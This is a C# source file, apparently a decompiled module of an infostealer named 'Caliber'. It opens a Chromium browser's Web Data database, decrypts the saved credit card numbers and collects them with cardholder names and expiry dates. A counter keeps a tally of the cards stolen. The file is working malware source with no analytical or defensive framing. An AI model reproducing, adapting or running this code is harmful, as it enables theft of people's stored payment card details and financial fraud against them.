﻿using System;
using System.Collections.Generic;

namespace youknowcaliber.Chromium
{
	internal sealed class CreditCards
	{
		public static List<CreditCard> Get(string sWebData)
		{
			List<CreditCard> result;
			try
			{
				List<CreditCard> list = new List<CreditCard>();
				SQLite sqlite = SqlReader.ReadTable(sWebData, "credit_cards");
				bool flag = sqlite == null;
				if (flag)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						CreditCard item = default(CreditCard);
						item.sNumber = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 4)));
						item.sExpYear = Crypto.GetUTF8(sqlite.GetValue(i, 3));
						item.sExpMonth = Crypto.GetUTF8(sqlite.GetValue(i, 2));
						item.sName = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						Counting.CreditCards++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<CreditCard>();
			}
			return result;
		}
	}
}
